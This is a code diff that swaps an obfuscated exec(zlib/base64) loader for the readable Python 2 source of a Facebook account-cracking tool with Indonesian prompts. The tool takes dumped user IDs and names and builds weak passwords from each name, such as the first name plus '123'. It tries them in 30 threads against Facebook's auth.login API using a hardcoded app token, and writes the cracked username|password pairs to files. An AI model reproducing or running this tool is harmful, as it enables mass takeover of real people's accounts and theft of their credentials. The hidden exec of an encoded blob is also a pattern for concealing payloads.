@@ -1,2 +1,138 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("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")))
+#!usr/bin/python2.7
+# coding=utf-8
+
+import requests, json, sys, os, re
+from multiprocessing.pool import ThreadPool as th
+from datetime import datetime
+
+class Brute:
+	def __init__(self):
+		self.setpw = False
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+
+	def bruteRequest(self, username, password):
+		params = {
+			'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+			'format': 'JSON',
+			'sdk_version': '2',
+			'email': username,
+			'locale': 'en_US',
+			'password': password,
+			'sdk': 'ios',
+			'generate_session_cookies': '1',
+			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+		}
+		try: os.mkdir('out')
+		except: pass
+		api = 'https://b-api.facebook.com/method/auth.login'
+		response = requests.get(api, params=params)
+		if re.search('(EAAA)\w+', response.text):
+			self.ok.append(username+'|'+password)
+			save = open('out/ok.txt','a')
+			save.write(str(username)+'|'+str(password)+'\n')
+			save.close()
+			return True
+		elif 'www.facebook.com' in response.json()['error_msg']:
+			self.cp.append(username+'|'+password)
+			save = open('out/cp.txt','a')
+			save.write(str(username)+'|'+str(password)+'\n')
+			save.close()
+			return True
+		else: return False
+
+	def brute(self, users):
+		if self.setpw == False:
+			self.loop +=1
+			for pw in users['pw']:
+				username = users['id'].lower()
+				password = pw.lower()
+				try:
+					if self.bruteRequest(username, password) == True:
+						break
+				except: pass
+				sys.stdout.write(
+					'\r[\033[0;91m{}\033[0m] Crack {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
+				); sys.stdout.flush()
+		else:
+			self.loop +=1
+			for pw in self.setpw:
+				username = users['id'].lower()
+				password = pw.lower()
+				try:
+					if self.bruteRequest(username, password) == True:
+						break
+				except: pass
+				sys.stdout.write(
+					'\r[\033[0;91m{}\033[0m] Crack {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
+				); sys.stdout.flush()
+
+	def main(self):
+		while True:
+			file = raw_input('\n\033[0;91m{\033[0;97mWARNING\033[0;91m} \033[0;92msebelum mulai crack, anda di haruskan nge dump id terlebih dahulu...\n\n\033[0;94mMasukan hasil dump tadi \033[0;97m{\033[0;92mcontoh\033[0;91m: \033[0;92mdump/xxx.json\033[0;97m} \033[0;91m:\033[0;96m ')
+			try:
+				list = open(file, 'r').read()
+				object = json.loads(list)
+				break
+			except IOError:
+				print("\n\033[0;91mfile '%s' tidak ada!\033[0m"% file)
+		self.target = []
+		for user in object:
+			try:
+				obj = user['name'].split(' ')
+				if len(obj) == 1:
+					listpass = [
+						obj[0]+'123', obj[0]+'1234',
+						obj[0]+'12345',
+					]
+				elif len(obj) == 2:
+					listpass = [
+						obj[0]+'123', obj[0]+'12345',
+						obj[1]+'123', obj[1]+'12345',
+					]
+				elif len(obj) == 3:
+					listpass = [
+						obj[0]+'123', obj[0]+'12345',
+						obj[1]+'123', obj[1]+'12345',
+						obj[2]+'123', obj[2]+'12345',
+					]
+				elif len(obj) == 4:
+					listpass = [
+						obj[0]+'123', obj[0]+'12345',
+						obj[1]+'123', obj[1]+'12345',
+						obj[2]+'123', obj[2]+'12345',
+						obj[3]+'123', obj[3]+'12345',
+					]
+				else:
+					listpass = [
+						'sayang', 'doraemon',
+						'bangsat', 'kontol'
+					]
+				self.target.append({'id': user['uid'], 'pw': listpass})
+			except: pass
+		if len(self.target) == 0:
+			exit("\n\033[0;91mid tidak ditemukan dalam file '%s'\033[0m"% file)
+		ask = raw_input('\033[0;93mGunakan kata sandi Defatuls atau Manual? \033[0;91m{\033[0;92md\033[0;97m/\033[0;96mm\033[0;91m} \033[0;93m:\033[0;91m\033[0m ')
+		if ask.lower() == 'm':
+			while True:
+				print('\n\033[0;97mMasukan kata sandi yang tertera disini \033[0;91m: \033[0;92msayang,doraemon,bangsat,kontol\n\033[0m')
+				self.setpw = raw_input('\033[0;94mMasukan password \033[0;91m:\033[0;92m ').strip().split(',')
+				if self.setpw[0] != '':
+					break
+				
+		th(30).map(self.brute, self.target)
+		self.results()
+		exit()
+
+	def results(self):
+		if (len(self.ok) != 0):
+			print('\n\nOK: '+str(len(self.ok)))
+			for i in self.ok: print('\033[0;92mOK+++ ' +str(i)+'\033[0m')
+			print('Hasil OK Anda disimpan di : out/ok.txt')
+		if (len(self.cp) != 0):
+			print('\n\nCP: '+str(len(self.cp)))
+			for i in self.cp: print('\033[0;93mcp××× '+str(i)+'\033[0m')
+			print('Hasil CP Anda disimpan di : out/cp.txt')
+		if (len(self.cp) == 0 and len(self.ok) == 0):
+			print('\n\nTidak ada hasil.\033[0m')
